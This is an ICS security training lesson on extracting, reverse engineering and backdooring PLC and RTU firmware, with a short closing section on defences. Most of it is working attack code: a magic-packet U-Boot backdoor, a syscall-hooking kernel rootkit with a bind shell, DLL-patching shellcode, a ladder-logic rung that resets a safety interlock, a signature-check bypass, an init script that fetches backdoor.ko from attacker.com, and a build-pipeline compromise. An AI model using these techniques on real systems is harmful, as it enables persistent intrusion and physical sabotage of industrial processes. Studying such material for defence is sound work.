Lesson 06: Firmware Manipulation &
Backdoors

Lesson 06: Firmware Manipulation &
Backdoors
Learning Objectives
●​ Extract firmware from PLCs, RTUs, and embedded ICS devices using hardware and
software techniques
●​ Reverse engineer firmware images with binwalk, Ghidra, and IDA Pro
●​ Inject sophisticated backdoors into firmware at bootloader, kernel, and application
levels
●​ Develop persistent rootkits that survive firmware updates
●​ Exploit firmware update mechanisms for supply chain attacks
●​ Analyze real-world firmware implants (NSA DEITYBOUNCE, Equation Group)
●​ Implement detection and mitigation strategies

1. Firmware Architecture in ICS Devices
Typical PLC Firmware Structure
┌─────────────────────────────────────┐
│ Bootloader (U-Boot, proprietary) │ <- First-stage, often signed
├─────────────────────────────────────┤
│ Linux Kernel (or RTOS)
│ <- VxWorks, QNX, embedded Linux
├─────────────────────────────────────┤
│ Root Filesystem (squashfs, jffs2) │ <- System libraries, configs
├─────────────────────────────────────┤
│ Runtime Environment
│ <- Siemens Step 7, AB RSLogix
├─────────────────────────────────────┤
│ User Program Storage (ladder logic)│ <- Modifiable by operator
└─────────────────────────────────────┘

Common Architectures
●​
●​
●​
●​
●​

ARM: Schneider Electric PLCs, ABB controllers
MIPS: Siemens S7-1200/1500 (some variants)
PowerPC: Allen-Bradley ControlLogix older models
x86: Modern SCADA servers, advanced PLCs
8051/AVR: Legacy RTUs, field devices

2. Firmware Extraction Techniques
2.1 Hardware Extraction Methods

JTAG Extraction
# Using OpenOCD with JTAG adapter (Bus Pirate, J-Link, ST-Link)
# Connect to PLC's JTAG test points (locate via PCB inspection)
# OpenOCD configuration for ARM Cortex-M4 PLC
cat > plc_target.cfg <<EOF
source [find interface/jlink.cfg]
transport select jtag
source [find target/stm32f4x.cfg]
reset_config srst_only
EOF
# Launch OpenOCD
openocd -f plc_target.cfg
# In separate terminal, connect with telnet
telnet localhost 4444
# Dump flash memory
> halt
> flash read_bank 0 firmware_dump.bin 0 0x100000
> shutdown
JTAG Pinout Identification:
#jtag_scanner.py - Automated JTAG pinout detection
import itertools
def jtag_scan(pins):
"""
Try all pin combinations to identify TDI, TDO, TCK, TMS
Based on IDCODE response pattern
"""
for combo in itertools.permutations(pins, 4):
tdi, tdo, tck, tms = combo
# Set up GPIO pins
setup_gpio(tck, tms, tdi, tdo)
# Send IDCODE instruction (0b00100)
send_jtag_instruction(0x02, tck, tms, tdi)
# Shift out 32 bits
idcode = shift_data_out(32, tck, tdo)
# Check if valid IDCODE (LSB must be 1, standard mandates)
if idcode & 0x1 and idcode != 0xFFFFFFFF:
print(f"[+] JTAG found: TCK={tck}, TMS={tms}, TDI={tdi}, TDO={tdo}")
print(f"[+] IDCODE: 0x{idcode:08x}")

return combo
return None
SPI Flash Extraction
# Using flashrom with CH341A programmer or Bus Pirate
# Physical steps:
# 1. Open PLC case (void warranty, safety first - disconnect power)
# 2. Locate SPI flash chip (25Q32, MX25L, W25Q64, etc.)
# 3. Use SOIC-8 clip or desolder chip
# Read with flashrom
flashrom -p ch341a_spi -r plc_firmware.bin
# Verify integrity (read twice, compare)
flashrom -p ch341a_spi -r plc_firmware_verify.bin
md5sum plc_firmware.bin plc_firmware_verify.bin
# Alternative: Using Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r firmware.bin
Direct SPI Communication (if flashrom fails):
# spi_dumper.py - Low-level SPI flash reading
import spidev
class SPIFlashDumper:
def __init__(self, bus=0, device=0):
self.spi = spidev.SpiDev()
self.spi.open(bus, device)
self.spi.max_speed_hz = 1000000
self.spi.mode = 0
def read_jedec_id(self):
"""Read manufacturer and device ID"""
response = self.spi.xfer2([0x9F, 0x00, 0x00, 0x00])
return response[1:] # [manufacturer, memory_type, capacity]
def read_page(self, address):
"""Read 256-byte page"""
cmd = [0x03, # READ command
(address >> 16) & 0xFF,
(address >> 8) & 0xFF,
address & 0xFF]
cmd.extend([0x00] * 256) # Dummy bytes for read
response = self.spi.xfer2(cmd)
return bytes(response[4:]) # Skip command bytes

def dump_full_chip(self, size_mb, output_file):
"""Dump entire flash chip"""
total_bytes = size_mb * 1024 * 1024
with open(output_file, 'wb') as f:
for addr in range(0, total_bytes, 256):
page = self.read_page(addr)
f.write(page)
if addr % 0x10000 == 0: # Progress every 64KB
print(f"[*] Dumped {addr / total_bytes * 100:.1f}%")
# Usage
dumper = SPIFlashDumper()
jedec = dumper.read_jedec_id()
print(f"[+] Flash ID: {jedec.hex()}")
dumper.dump_full_chip(4, "firmware_dump.bin") # 4MB chip
UART Console Access
# Identify UART pins (TX, RX, GND) with logic analyzer or multimeter
# Look for 3.3V or 5V periodic signals during boot
# Common baud rates: 9600, 19200, 38400, 57600, 115200
# Connect with screen or minicom
screen /dev/ttyUSB0 115200
# If bootloader unlocked, may drop to shell during boot
# Press space/enter repeatedly during boot sequence
# Common bootloader prompts: "U-Boot>", "CFE>", "redboot>"
# U-Boot firmware dump commands
U-Boot> printenv # Show environment variables
U-Boot> md.b 0x80000000 0x100000 # Memory dump (hex)
U-Boot> tftp 0x81000000 dump.bin # TFTP transfer to attacker server

2.2 Network Extraction Methods
Intercepting Firmware Updates
# firmware_interceptor.py - MitM firmware update traffic
from scapy.all import *
import hashlib
class FirmwareInterceptor:
def __init__(self, target_plc, update_server):
self.target = target_plc
self.server = update_server
self.firmware_chunks = []

def packet_handler(self, pkt):
# Intercept HTTP firmware downloads
if pkt.haslayer(TCP) and pkt.haslayer(Raw):
payload = pkt[Raw].load
# Detect firmware transfer (look for known headers)
if b'PK\x03\x04' in payload: # ZIP file
print("[+] Detected firmware ZIP transfer")
self.firmware_chunks.append(payload)
elif payload.startswith(b'\x7fELF'): # ELF binary
print("[+] Detected ELF firmware binary")
self.firmware_chunks.append(payload)
# Siemens S7 firmware signature
elif b'SiemensAG' in payload or b'STEP7' in payload:
print("[+] Detected Siemens firmware")
self.firmware_chunks.append(payload)
def start_capture(self):
"""Sniff network for firmware transfers"""
filter_str = f"host {self.target} and host {self.server}"
sniff(filter=filter_str, prn=self.packet_handler, store=0)
def save_firmware(self, output_file):
"""Reconstruct and save captured firmware"""
firmware = b''.join(self.firmware_chunks)
with open(output_file, 'wb') as f:
f.write(firmware)
print(f"[+] Saved {len(firmware)} bytes to {output_file}")
print(f"[+] MD5: {hashlib.md5(firmware).hexdigest()}")
# Usage
interceptor = FirmwareInterceptor("10.10.10.50", "update.siemens.com")
interceptor.start_capture()
Web Interface Firmware Download
# plc_firmware_downloader.py - Download firmware from PLC web interface
import requests
from requests.auth import HTTPBasicAuth
class PLCFirmwareDownloader:
def __init__(self, plc_ip, username="admin", password="admin"):
self.base_url = f"http://{plc_ip}"
self.auth = HTTPBasicAuth(username, password)
self.session = requests.Session()

def download_siemens_s7(self):
"""Download firmware from Siemens S7-1200 web interface"""
# Navigate to firmware backup page
backup_url = f"{self.base_url}/Firmware/Backup.html"
# Trigger backup generation
response = self.session.post(
f"{self.base_url}/api/firmware/backup",
auth=self.auth
)
if response.status_code == 200:
backup_id = response.json()['backup_id']
# Download generated backup
download_url = f"{self.base_url}/api/firmware/download/{backup_id}"
firmware = self.session.get(download_url, auth=self.auth)
with open('s7_firmware.bin', 'wb') as f:
f.write(firmware.content)
print(f"[+] Downloaded {len(firmware.content)} bytes")
return firmware.content
def download_schneider_m340(self):
"""Schneider Modicon M340 firmware extraction"""
# Many Schneider PLCs expose firmware via FTP
import ftplib
ftp = ftplib.FTP(self.base_url.replace('http://', ''))
ftp.login(user='USER', passwd='USER') # Default Schneider creds
# List files
files = ftp.nlst()
print(f"[+] FTP files: {files}")
# Download firmware
with open('m340_firmware.bin', 'wb') as f:
ftp.retrbinary('RETR firmware.bin', f.write)
ftp.quit()
# Usage
downloader = PLCFirmwareDownloader("192.168.1.10")
downloader.download_siemens_s7()
Vendor Update Server Reconnaissance

# Discover firmware update servers via DNS/WHOIS
host update.siemens.com
host plc-updates.rockwellautomation.com
host firmware.schneider-electric.com
# Check for unprotected firmware repositories
curl http://update-server.vendor.com/firmware/ | grep -i ".bin\|.img\|.hex"
# Download historical firmware versions
wget -r -np -nH --cut-dirs=2 \
http://update-server.vendor.com/firmware/plc_model/
# Analyze for vulnerabilities in older versions

3. Firmware Analysis & Reverse Engineering
3.1 Initial Triage with binwalk
# Identify embedded components
binwalk firmware.bin
# Common output:
#0
U-Boot bootloader
# 0x40000 Linux kernel (gzip compressed)
# 0x200000 Squashfs filesystem
# 0x800000 JFFS2 filesystem (configuration storage)
# Extract all components
binwalk -e firmware.bin
cd _firmware.bin.extracted/
# Extract filesystem
unsquashfs 200000.squashfs
ls squashfs-root/
# bin/ etc/ lib/ usr/ var/ www/
# Analyze filesystem
tree squashfs-root/
grep -r "password" squashfs-root/etc/
find squashfs-root/ -name "*.conf" -exec cat {} \;

3.2 Advanced Firmware Analysis with Firmware Analysis Toolkit (FAT)
# Install FAT
git clone https://github.com/attify/firmware-analysis-toolkit
cd firmware-analysis-toolkit
./setup.sh

# Automated analysis
./fat.py firmware.bin
# FAT performs:
# 1. File system extraction
# 2. Emulation with QEMU
# 3. Network service enumeration
# 4. Web interface access
# 5. Binary analysis
# Access emulated firmware
# Navigate to http://127.0.0.1:8080 (firmware web interface running in QEMU)

3.3 Binary Reverse Engineering with Ghidra
# ghidra_analysis_script.py - Automated Ghidra analysis
# Run with: analyzeHeadless /path/to/project ProjectName -import firmware.bin -postScript
ghidra_analysis_script.py
from ghidra.program.model.listing import CodeUnit
def find_hardcoded_credentials():
"""Locate hardcoded usernames/passwords"""
currentProgram = getCurrentProgram()
memory = currentProgram.getMemory()
listing = currentProgram.getListing()
# Search for common credential patterns
patterns = [
b"username",
b"password",
b"admin",
b"root",
b"USER",
b"PASS"
]
findings = []
for pattern in patterns:
# Search memory
found = memory.findBytes(memory.getMinAddress(), pattern, None, True, monitor)
while found:
# Get surrounding context (50 bytes before/after)
context_addr = found.subtract(50)
context = memory.getBytes(context_addr, 100)
findings.append({

'address': found,
'pattern': pattern,
'context': context
})
found = memory.findBytes(found.add(1), pattern, None, True, monitor)
return findings
def find_crypto_keys():
"""Locate cryptographic keys and constants"""
# RSA key pattern (PEM format)
rsa_pattern = b"-----BEGIN RSA PRIVATE KEY-----"
# AES S-box (first 16 bytes)
aes_sbox = bytes([0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76])
# Search for cryptographic indicators
print("[*] Searching for cryptographic material...")
def analyze_boot_sequence():
"""Trace bootloader and initialization"""
currentProgram = getCurrentProgram()
# Find entry point
entry = currentProgram.getMemory().getProgram().getImageBase()
print(f"[*] Entry point: {entry}")
# Decompile boot function
decompiler = ghidra.app.decompiler.DecompInterface()
decompiler.openProgram(currentProgram)
func = getFunctionAt(entry)
if func:
results = decompiler.decompileFunction(func, 30, monitor)
print(results.getDecompiledFunction().getC())
# Execute analysis
print("[*] Starting automated Ghidra analysis...")
creds = find_hardcoded_credentials()
for c in creds:
print(f"[+] Found credential pattern at {c['address']}: {c['context']}")
find_crypto_keys()
analyze_boot_sequence()

3.4 Dynamic Analysis with QEMU
# Emulate ARM firmware in QEMU
qemu-system-arm \
-M versatilepb \
-kernel extracted_kernel.bin \
-dtb device_tree.dtb \
-drive file=rootfs.ext4,if=scsi,format=raw \
-append "root=/dev/sda console=ttyAMA0,115200" \
-nographic \
-net nic,model=rtl8139 \
-net tap,ifname=tap0
# Attach debugger
qemu-system-arm ... -s -S # Wait for GDB on port 1234
# In another terminal
gdb-multiarch
(gdb) target remote localhost:1234
(gdb) break *0x80000000 # Bootloader entry point
(gdb) continue

4. Backdoor Injection Techniques
4.1 Bootloader-Level Backdoor
/* u-boot_backdoor.c - Inject into U-Boot bootloader
* Triggers on magic Ethernet frame, provides shell access
*/
#include <common.h>
#include <net.h>
#define MAGIC_SIGNATURE 0xDEADBEEF
// Hook into eth_rx() - called on every received packet
int eth_rx_hooked(void) {
struct ethernet_hdr *eth = (struct ethernet_hdr *)NetRxPackets[0];
uint32_t *magic = (uint32_t *)(eth + 1); // After Ethernet header
// Check for magic activation packet
if (ntohs(eth->et_protlen) == 0x9999 && *magic == MAGIC_SIGNATURE) {
printf("[BACKDOOR] Magic packet received, spawning shell...\n");
// Start TFTP server for file exfiltration
setenv("autoload", "no");
NetStartAgain();

// Drop to U-Boot shell (accessible via UART or network)
run_command("md.b 0 100000", 0); // Memory dump example
return 0; // Don't process packet further
}
// Call original handler
return eth_rx_original();
}
// Inject point: Modify U-Boot's main_loop()
void main_loop_hooked(void) {
// Replace eth_rx function pointer
extern int (*eth_rx_ptr)(void);
eth_rx_ptr = eth_rx_hooked;
// Continue normal boot
main_loop_original();
}
Compilation and Injection:
# Compile backdoor
arm-none-eabi-gcc -c -mcpu=cortex-a9 u-boot_backdoor.c -o backdoor.o
# Locate injection point in original firmware
objdump -d original_firmware.bin | grep "main_loop"
# Patch firmware with custom linker script
cat > inject.ld <<EOF
SECTIONS {
.backdoor 0x80040000 : {
backdoor.o(.text)
}
}
EOF
arm-none-eabi-ld -T inject.ld backdoor.o -o backdoor.elf
arm-none-eabi-objcopy -O binary backdoor.elf backdoor.bin
# Manually patch firmware (replace NOP region or extend)
dd if=backdoor.bin of=original_firmware.bin bs=1 seek=$((0x40000)) conv=notrunc
# Update function pointer at main_loop call site
printf '\x00\x40\x00\x80' | dd of=original_firmware.bin bs=1 seek=$((0x1234)) conv=notrunc

4.2 Kernel Module Backdoor (Linux-based PLCs)
/* plc_rootkit.c - Loadable kernel module backdoor

* Hides processes, files, and network connections
* Provides covert command execution
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ICS Red Team");
#define BACKDOOR_PREFIX "plc_" // Hide files/processes starting with this
// Syscall table hooking
static unsigned long *__sys_call_table;
typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
orig_getdents_t orig_getdents;
// Hooked getdents64 - hide files
asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int
count) {
long ret = orig_getdents(fd, dirp, count);
struct linux_dirent64 *cur = dirp;
unsigned long offset = 0;
while (offset < ret) {
// Hide entries starting with BACKDOOR_PREFIX
if (strncmp(cur->d_name, BACKDOOR_PREFIX, strlen(BACKDOOR_PREFIX)) == 0) {
// Skip this entry
unsigned int reclen = cur->d_reclen;
char *next = (char *)cur + reclen;
memmove(cur, next, ret - offset - reclen);
ret -= reclen;
continue;
}
offset += cur->d_reclen;
cur = (struct linux_dirent64 *)((char *)dirp + offset);
}
return ret;
}
// Network backdoor - bind shell on trigger
static int backdoor_shell(void) {
// Listen on port 31337

// When connection received, spawn /bin/sh
call_usermodehelper("/bin/sh", NULL, NULL, UMH_WAIT_EXEC);
return 0;
}
// Module initialization
static int __init rootkit_init(void) {
printk(KERN_INFO "PLC Rootkit loaded\n");
// Find syscall table
__sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
// Disable write protection
write_cr0(read_cr0() & (~0x10000));
// Hook syscalls
orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents64];
__sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
// Re-enable write protection
write_cr0(read_cr0() | 0x10000);
return 0;
}
static void __exit rootkit_exit(void) {
// Unhook syscalls
write_cr0(read_cr0() & (~0x10000));
__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents;
write_cr0(read_cr0() | 0x10000);
printk(KERN_INFO "PLC Rootkit unloaded\n");
}
module_init(rootkit_init);
module_exit(rootkit_exit);
Deployment:
# Cross-compile for PLC's architecture
export ARCH=arm
export CROSS_COMPILE=arm-linux-gnueabimake -C /path/to/kernel/source M=$(pwd) modules
# Inject into firmware filesystem
cp plc_rootkit.ko _firmware.extracted/squashfs-root/lib/modules/
echo "insmod /lib/modules/plc_rootkit.ko" >> _firmware.extracted/squashfs-root/etc/init.d/rcS

# Rebuild firmware
mksquashfs squashfs-root/ new_rootfs.squashfs -comp xz
# Replace in original firmware image
dd if=new_rootfs.squashfs of=modified_firmware.bin bs=1 seek=$((0x200000))
conv=notrunc

4.3 Application-Level Backdoor (Siemens S7 Example)
# s7_app_backdoor.py - Inject backdoor into S7 communication handler
# Modifies s7oiehsx.dll (S7 OPC server DLL) or plcsim executable
import pefile
import struct
def inject_s7_backdoor(target_dll, output_dll):
"""
Inject backdoor into Siemens S7 application DLL
Backdoor activates on specific S7 function code
"""
pe = pefile.PE(target_dll)
# Locate S7 packet handling function (reverse engineered)
# Signature: 55 8B EC 83 EC 40 53 56 57 (push ebp; mov ebp, esp; sub esp, 0x40; ...)
s7_handler_signature = b'\x55\x8B\xEC\x83\xEC\x40\x53\x56\x57'
# Find signature in .text section
for section in pe.sections:
if section.Name.startswith(b'.text'):
offset = section.get_data().find(s7_handler_signature)
if offset != -1:
print(f"[+] Found S7 handler at offset: 0x{offset:x}")
# Inject hook at function prologue
# Original: 55 8B EC 83 EC 40
# Modified: E9 XX XX XX XX (jmp to backdoor code)
backdoor_offset = len(section.get_data()) # Append to end
jmp_offset = backdoor_offset - (offset + 5)
hook = b'\xE9' + struct.pack('<i', jmp_offset)
# Backdoor shellcode (x86)
backdoor_code = assemble_backdoor_shellcode()
# Patch binary
pe.set_bytes_at_offset(section.PointerToRawData + offset, hook)
pe.set_bytes_at_offset(section.PointerToRawData + backdoor_offset,
backdoor_code)

# Write modified PE
pe.write(filename=output_dll)
print(f"[+] Backdoored DLL saved to {output_dll}")
def assemble_backdoor_shellcode():
"""
x86 shellcode that:
1. Checks if S7 function code is 0xFF (magic trigger)
2. If yes, execute payload (reverse shell, modify logic, etc.)
3. Otherwise, execute original handler
"""
shellcode = bytes([
# Check S7 function code (at [ebp+8])
0x8B, 0x45, 0x08,
# mov eax, [ebp+8]
0x80, 0x38, 0xFF,
# cmp byte ptr [eax], 0xFF
0x75, 0x10,
# jne original_handler
# Backdoor payload: spawn cmd.exe
0x33, 0xC9,
# xor ecx, ecx
0x51,
# push ecx (null terminator)
0x68, 0x2E, 0x65, 0x78, 0x65, # push ".exe"
0x68, 0x63, 0x6D, 0x64, 0x20, # push "cmd "
0x54,
# push esp
0x68, 0x77, 0x65, 0x6E, 0x74, # push "went" (WinExec)
# ... (simplified, full shellcode would use WinExec or CreateProcess)
# original_handler:
# Jump back to original function (restore prologue + continue)
0x55,
# push ebp
0x8B, 0xEC,
# mov ebp, esp
0x83, 0xEC, 0x40,
# sub esp, 0x40
0xE9, 0x00, 0x00, 0x00, 0x00 # jmp [original+5] (patched at runtime)
])
return shellcode
# Usage
inject_s7_backdoor("C:\\Program Files\\Siemens\\S7\\s7oiehsx.dll",
"s7oiehsx_backdoored.dll")

4.4 PLC Ladder Logic Backdoor
# ladder_logic_backdoor.py - Inject malicious logic into PLC program
# Works with Siemens S7, Allen-Bradley, etc.
from snap7 import client
import struct

class LadderLogicBackdoor:
def __init__(self, plc_ip):
self.plc = client.Client()
self.plc.connect(plc_ip, 0, 1)
def inject_hidden_rung(self, ob_number=1):
"""
Inject hidden rung into Organization Block
Rung activates on specific memory bit, executes payload
"""
# Download existing OB1
ob_data = self.plc.full_upload(snap7.types.Block_OB, ob_number)
# Decode ladder logic (Siemens MC7 bytecode)
# MC7 instruction format (simplified):
# - U M 0.0: Load memory bit M0.0
# - = Q 4.0: Set output Q4.0
# Craft backdoor rung (in MC7 bytecode):
# IF M100.0 (hidden activation bit) THEN
# Q4.0 := 1 (open valve)
# Q4.1 := 0 (close safety interlock)
backdoor_rung = bytes([
0x70, 0x00, 0x64, 0x00, # U M 100.0 (load hidden bit)
0x71, 0x82, 0x04, 0x00, # = Q 4.0 (set output)
0x72, 0x82, 0x04, 0x01, # R Q 4.1 (reset safety)
0x00, 0x00
# BEU (Block End Unconditional)
])
# Insert at end of OB1 (before BEU)
modified_ob = ob_data[:-2] + backdoor_rung
# Upload modified OB1
self.plc.download(snap7.types.Block_OB, ob_number, modified_ob)
print("[+] Backdoor rung injected into OB1")
def activate_backdoor(self):
"""Trigger backdoor by setting hidden bit"""
# Set M100.0 = 1
self.plc.mb_write(100, 0, bytes([0x01]))
print("[+] Backdoor activated")
def create_stealth_function_block(self):
"""
Create hidden Function Block that appears benign
FB name: "PID_Control" (looks legitimate)

Actual behavior: Data exfiltration via Modbus
"""
# Craft FB in MC7 bytecode
# Appears to do PID control, but also copies process data to hidden DB
stealth_fb = self.craft_fb_bytecode()
# Upload as FB 100
self.plc.download(snap7.types.Block_FB, 100, stealth_fb)
# Modify OB1 to call FB100 every cycle
self.inject_fb_call(ob=1, fb=100)
# Usage
backdoor = LadderLogicBackdoor("192.168.1.10")
backdoor.inject_hidden_rung()
backdoor.activate_backdoor()

5. Advanced Persistence Mechanisms
5.1 Firmware Update Mechanism Hijacking
# update_hijacker.py - Persist across legitimate firmware updates
# Technique: Hook update verification function to re-inject backdoor
class FirmwareUpdateHijacker:
def __init__(self, firmware_image):
self.firmware = bytearray(open(firmware_image, 'rb').read())
def hook_update_verification(self):
"""
Modify firmware update code to skip signature verification
and re-inject backdoor after update
"""
# Locate signature check function (example for hypothetical PLC)
# Signature: E8 XX XX XX XX 85 C0 74 (call verify_sig; test eax; jz)
sig_check_pattern = b'\xE8....\x85\xC0\x74'
offset = self.find_pattern(sig_check_pattern)
if offset:
# Patch: Change 'jz fail' to 'jmp success'
self.firmware[offset + 7] = 0xEB # JZ -> JMP
print("[+] Signature check bypassed")
# Inject post-update hook
self.inject_post_update_script()

def inject_post_update_script(self):
"""
Add script to /etc/init.d/ that re-downloads backdoor after update
"""
script = b"""#!/bin/sh
# Legitimate-looking startup script
if [ ! -f /lib/modules/network_driver.ko ]; then
wget http://attacker.com/backdoor.ko -O /lib/modules/network_driver.ko
insmod /lib/modules/network_driver.ko
fi
"""
# Locate init script section in firmware
# Append to rcS or create new init script
self.append_to_filesystem('/etc/init.d/S99persistence', script)
def append_to_filesystem(self, path, content):
"""Add file to squashfs filesystem in firmware"""
# Extract filesystem
os.system(f"binwalk -e firmware.bin")
# Modify
with open(f"_firmware.extracted/squashfs-root/{path}", 'wb') as f:
f.write(content)
# Rebuild
os.system("mksquashfs squashfs-root/ new_fs.bin")
# Replace in firmware
# (implementation depends on firmware layout)
# Usage
hijacker = FirmwareUpdateHijacker("original_firmware.bin")
hijacker.hook_update_verification()

5.2 Hardware-Based Persistence (SPI Flash Protection Bypass)
# flash_protection_bypass.py - Bypass flash write protection
# Some PLCs use SPI flash status register to protect boot sectors
import spidev
class FlashProtectionBypass:
def __init__(self):
self.spi = spidev.SpiDev()
self.spi.open(0, 0)
def read_status_register(self):

"""Read flash protection status"""
cmd = [0x05, 0x00] # RDSR command
result = self.spi.xfer2(cmd)
return result[1]
def disable_write_protection(self):
"""
Clear Status Register Protection (SRP) and Block Protection (BP) bits
This allows writing to protected boot sectors
"""
# Enable write operations
self.spi.xfer2([0x06]) # WREN (Write Enable)
# Write Status Register (clear protection bits)
# SR format: [SRP, 0, 0, BP2, BP1, BP0, WEL, WIP]
# Set to 0x00 (no protection)
self.spi.xfer2([0x01, 0x00]) # WRSR command
# Verify
status = self.read_status_register()
if status == 0x00:
print("[+] Write protection disabled")
return True
else:
print(f"[-] Protection still active: 0x{status:02x}")
return False
def write_bootloader_backdoor(self, backdoor_code):
"""
Write backdoor to bootloader section (sector 0)
Survives any application-level firmware update
"""
if not self.disable_write_protection():
return False
# Erase sector 0
self.spi.xfer2([0x06]) # WREN
self.spi.xfer2([0x20, 0x00, 0x00, 0x00]) # Sector erase
# Wait for erase completion
while self.read_status_register() & 0x01:
pass
# Write backdoor to address 0x0000
self.spi.xfer2([0x06]) # WREN
cmd = [0x02, 0x00, 0x00, 0x00] # Page Program
cmd.extend(list(backdoor_code))
self.spi.xfer2(cmd)

print("[+] Bootloader backdoor written")
# Usage (requires physical access or compromised BMC)
bypass = FlashProtectionBypass()
bypass.write_bootloader_backdoor(bootloader_payload)

6. Real-World Case Studies
6.1 NSA ANT Catalog - DEITYBOUNCE
Target: Dell PowerEdge servers (common in SCADA environments)
Technique:
●​ BIOS implant that survives OS reinstall
●​ Loaded during platform initialization
●​ Provides persistent remote access via BIOS-level SMM (System Management Mode)
Implementation Analysis:
/* deitybounce_concept.c - BIOS implant concept
* Actual NSA implementation is classified, this is educational reconstruction
*/
// Hook INT 13h (disk I/O) in BIOS
void __attribute__((section(".bios_hook"))) int13_hook(void) {
// Check for magic sector read request
if (AH == 0x02 && CX == 0xDEAD) { // Read sector 0xDEAD
// Magic trigger detected
// Load SMM payload from hidden BIOS region
void (*smm_payload)(void) = (void *)0xFED00000; // SMRAM base
smm_payload();
} else {
// Call original INT 13h handler
int13_original();
}
}
// SMM payload - highest privilege level, invisible to OS
void smm_backdoor(void) {
// Modify OS kernel in memory
// Inject network backdoor
// Exfiltrate data via IPMI or NIC firmware
}

6.2 Equation Group - IRATEMONK

Target: Hard drive firmware (Western Digital, Seagate, Maxtor)
Technique:
●​ Modifies HDD firmware to create hidden storage area
●​ Intercepts disk reads/writes
●​ Persists below OS level (even survives disk format)
Detection:
# detect_hdd_implant.py - Detect firmware anomalies
import subprocess
def check_hdd_firmware():
"""
Check for firmware version mismatches and hidden sectors
"""
# Get drive info
output = subprocess.check_output(['hdparm', '-I', '/dev/sda'])
# Extract firmware version
for line in output.decode().split('\n'):
if 'Firmware Revision' in line:
fw_version = line.split(':')[1].strip()
print(f"[*] Firmware version: {fw_version}")
# Compare against known-good database
if fw_version not in KNOWN_GOOD_VERSIONS:
print("[!] SUSPICIOUS: Unknown firmware version")
# Check for hidden sectors (HPA - Host Protected Area)
hpa_output = subprocess.check_output(['hdparm', '-N', '/dev/sda'])
if 'sectors' in hpa_output.decode():
print("[!] WARNING: Host Protected Area detected")
print("[*] This could indicate IRATEMONK or similar implant")
# Usage
check_hdd_firmware()

6.3 Supply Chain Firmware Backdoor (Hypothetical ICS Scenario)
# supply_chain_attack.py - Inject backdoor during manufacturing
# Scenario: Attacker compromises PLC vendor's build server
class SupplyChainInjection:
def __init__(self, build_server):
self.server = build_server
def compromise_build_pipeline(self):

"""
Modify automated build process to inject backdoor
into all manufactured units
"""
# Locate firmware build script
build_script = "/opt/plc_build/create_firmware.sh"
# Inject backdoor compilation step
backdoor_injection = """
# Compile backdoor module
gcc -c backdoor.c -o backdoor.o
# Link into firmware
ld -r firmware.o backdoor.o -o firmware_final.o
# Sign with stolen code-signing certificate
sign_firmware firmware_final.bin
"""
# Append to build script
with open(build_script, 'a') as f:
f.write(backdoor_injection)
print("[+] Build pipeline compromised")
print("[+] All future firmware builds will include backdoor")
def steal_signing_certificate(self):
"""
Exfiltrate code-signing certificate from build server
Allows signing backdoored firmware as legitimate
"""
cert_path = "/opt/plc_build/certs/codesign.pfx"
# ... exfiltration logic

7. Defensive Countermeasures
7.1 Firmware Integrity Verification
# firmware_integrity_checker.py - Verify PLC firmware integrity
import hashlib
import snap7
class FirmwareIntegrityChecker:
def __init__(self, plc_ip):
self.plc = snap7.client.Client()
self.plc.connect(plc_ip, 0, 1)

# Known-good firmware hashes (from vendor)
self.known_good_hashes = {
"Siemens S7-1200 FW 4.2": "a1b2c3d4e5f6...",
"Siemens S7-1500 FW 2.8": "1a2b3c4d5e6f...",
}
def calculate_firmware_hash(self):
"""
Download firmware and calculate hash
"""
# Upload all blocks
firmware_parts = []
for block_type in ['OB', 'FB', 'FC', 'DB']:
block_list = self.plc.list_blocks_of_type(block_type)
for block_num in block_list:
data = self.plc.full_upload(block_type, block_num)
firmware_parts.append(data)
# Concatenate and hash
full_firmware = b''.join(firmware_parts)
firmware_hash = hashlib.sha256(full_firmware).hexdigest()
return firmware_hash
def verify_integrity(self):
"""
Compare against known-good hash
"""
current_hash = self.calculate_firmware_hash()
for fw_version, known_hash in self.known_good_hashes.items():
if current_hash == known_hash:
print(f"[+] Firmware integrity verified: {fw_version}")
return True
print("[!] ALERT: Firmware hash mismatch - possible tampering!")
print(f"[!] Current hash: {current_hash}")
return False
# Usage - run periodically
checker = FirmwareIntegrityChecker("192.168.1.10")
checker.verify_integrity()

7.2 Secure Boot Implementation
# Enable secure boot on modern PLCs
# Requires UEFI-capable PLC (Siemens S7-1500, ABB AC500)

# 1. Generate signing keys
openssl genrsa -out platform_key.pem 2048
openssl req -new -x509 -key platform_key.pem -out platform_cert.pem
# 2. Sign firmware image
sbsign --key platform_key.pem --cert platform_cert.pem firmware.bin --output
firmware_signed.bin
# 3. Upload public key to PLC's secure enclave
# (vendor-specific process, usually requires physical access and cryptographic ceremony)
# 4. Configure PLC to reject unsigned firmware
# Set boot policy via vendor software (e.g., Siemens TIA Portal)

7.3 Runtime Firmware Attestation
# runtime_attestation.py - Continuous firmware monitoring
# Uses TPM (Trusted Platform Module) if available
import hashlib
import time
class RuntimeAttestation:
def __init__(self, plc_ip):
self.plc_ip = plc_ip
self.baseline_hash = None
def establish_baseline(self):
"""
Create cryptographic baseline of firmware and configuration
"""
self.baseline_hash = self.measure_system_state()
print(f"[+] Baseline established: {self.baseline_hash}")
def measure_system_state(self):
"""
Measure:
- Firmware blocks
- System configuration
- Communication settings
"""
checker = FirmwareIntegrityChecker(self.plc_ip)
fw_hash = checker.calculate_firmware_hash()
# Also measure configuration
# (IP settings, user accounts, etc.)
config_hash = self.get_config_hash()

# Combine into attestation measurement
combined = f"{fw_hash}{config_hash}"
return hashlib.sha256(combined.encode()).hexdigest()
def continuous_monitoring(self, interval=300):
"""
Periodically verify firmware hasn't changed
Alert on any deviation
"""
while True:
current_hash = self.measure_system_state()
if current_hash != self.baseline_hash:
self.alert_integrity_violation(current_hash)
time.sleep(interval)
